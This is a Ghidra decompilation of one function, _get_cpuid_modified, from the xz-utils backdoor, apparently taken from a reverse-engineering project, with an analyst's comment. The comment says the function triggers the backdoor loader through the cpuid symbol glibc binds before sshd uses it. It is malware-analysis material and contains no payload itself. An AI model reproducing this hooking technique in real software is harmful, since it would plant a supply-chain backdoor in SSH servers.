// /home/kali/xzre-ghidra/xzregh/10A800_get_cpuid_modified.c
// Function: _get_cpuid_modified @ 0x10A800
// Calling convention: unknown
// Prototype: undefined _get_cpuid_modified(void)


/* Wrapper around `_cpuid_gcc` that first invokes `backdoor_entry` with the high-bit leaf to make
   sure the loader ran, checks the returned maximum leaf, and only executes the requested CPUID if
   the CPU claims to support it. This is the exported symbol glibc binds, so the loader’s work is
   triggered before any sshd thread asks for cpuid data. */

undefined8
_get_cpuid_modified(uint param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
                   undefined8 param_5,undefined8 param_6)

{
  uint uVar1;
  undefined8 uVar2;
  uint max_leaf;
  
  uVar1 = backdoor_entry(param_1 & 0x80000000,param_6);
  if ((uVar1 == 0) || (uVar1 < param_1)) {
    uVar2 = 0;
  }
  else {
    _cpuid_gcc(param_1,param_2,param_3,param_4,param_5,0);
    uVar2 = 1;
  }
  return uVar2;
}

